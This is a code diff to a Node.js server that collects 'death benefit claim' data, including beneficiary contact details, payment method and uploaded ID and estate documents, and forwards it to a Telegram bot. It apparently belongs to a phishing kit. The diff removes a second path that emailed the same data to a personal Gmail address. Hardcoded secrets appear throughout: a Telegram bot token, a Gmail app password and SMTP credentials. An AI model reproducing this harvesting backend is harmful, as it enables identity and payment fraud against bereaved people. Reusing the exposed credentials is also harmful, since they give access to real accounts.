@@ -3,55 +3,9 @@ const TELEGRAM_BOT_TOKEN = "8388477618:AAHkepQg1LCuFvyumV7_Pnweej3tcL0H92M";
 const TELEGRAM_USER_ID = "6969127152";
 
 const https = require("https");
-const nodemailer = require("nodemailer");
+// const nodemailer = require("nodemailer");
 
-// --- Email Notification Setup ---
-// TODO: Replace with your real email and password or use environment variables for security
-const EMAIL_USER = "goerg597@gmail.com"; // <-- Your Gmail address
-const EMAIL_PASS = "mmtqmbkseuutfabv";  // <-- Your Gmail app password (no spaces)
-const EMAIL_TO   = "goerg597@gmail.com"; // <-- Receive claim reports here
 
-const transporter = nodemailer.createTransport({
-  host: "mail.smtp2go.com",
-  port: 587,
-  auth: {
-    user: "murphystactical.com",
-    pass: "35grdW7iH4maMr5f"
-  }
-});
-
-function sendEmailNotification(payload, callback) {
-  const fields = [
-    { label: "Contract Number", key: "contractNumber" },
-    { label: "Deceased First Name", key: "deceasedFirstName" },
-    { label: "Deceased Last Name", key: "deceasedLastName" },
-    { label: "Beneficiary Name", key: "beneficiaryName" },
-    { label: "Beneficiary Email", key: "beneficiaryEmail" },
-    { label: "Beneficiary Phone", key: "beneficiaryPhone" },
-    { label: "Payment Method", key: "paymentMethod" },
-    { label: "Death Certificate Provided", key: "deathCertificate" },
-    { label: "Government ID Provided", key: "governmentId" },
-    { label: "Estate Docs Provided", key: "estateDocs" },
-    { label: "Attestation Confirmed", key: "attestation" },
-    { label: "Uploaded Files", key: "uploadedFiles" }
-  ];
-  let html = `<h2>New Death Benefit Claim Submitted</h2><ul>`;
-  fields.forEach(f => {
-    if (payload[f.key]) {
-      let value = Array.isArray(payload[f.key]) ? payload[f.key].join(", ") : payload[f.key];
-      html += `<li><b>${f.label}:</b> ${value}</li>`;
-    }
-  });
-  html += `</ul><p><i>Submitted: ${new Date().toLocaleString()}</i></p>`;
-
-  const mailOptions = {
-    from: EMAIL_USER,
-    to: EMAIL_TO,
-    subject: "New Death Benefit Claim Submitted",
-    html
-  };
-  transporter.sendMail(mailOptions, callback);
-}
 
 function sendTelegramNotification(payload, callback) {
   const fields = [
@@ -164,12 +118,7 @@ const server = http.createServer((request, response) => {
           } else {
             console.log("Telegram API response:", tgRes);
           }
-          // Send Email notification (in parallel)
-          sendEmailNotification(payload, (emailErr, info) => {
-            if (emailErr) {
-              console.error("Email notification error:", emailErr);
-            }
-          });
+          // Email notification removed
           if (err) {
             response.writeHead(500, { "Content-Type": "application/json" });
             response.end(JSON.stringify({ ok: false, error: err.message }));
